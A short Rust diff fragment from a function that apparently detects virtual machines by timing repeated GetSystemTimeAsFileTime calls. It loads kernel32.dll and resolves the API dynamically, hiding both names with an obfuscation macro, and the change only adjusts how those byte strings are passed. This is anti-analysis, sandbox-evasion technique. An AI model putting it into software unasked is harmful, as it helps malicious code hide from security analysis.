@@ -6,13 +6,13 @@ pub fn is_running_in_vm_api_flooding(iterations: u32, threshold_ms: u128) -> boo
     use crate::utils::{load_library, get_proc_address};
 
     unsafe {
-        let kernel32 = match load_library(&obfbytes!(b"kernel32.dll\0")) {
+        let kernel32 = match load_library(obfbytes!(b"kernel32.dll\0").as_slice()) {
             Ok(lib) => lib,
             Err(_) => return false,
         };
 
         // Resolve GetSystemTimeAsFileTime to repeatedly call and measure
-        let p_time = match get_proc_address(kernel32, &obfbytes!(b"GetSystemTimeAsFileTime\0")) {
+        let p_time = match get_proc_address(kernel32, obfbytes!(b"GetSystemTimeAsFileTime\0").as_slice()) {
             Ok(f) => f,
             Err(_) => return false,
         };
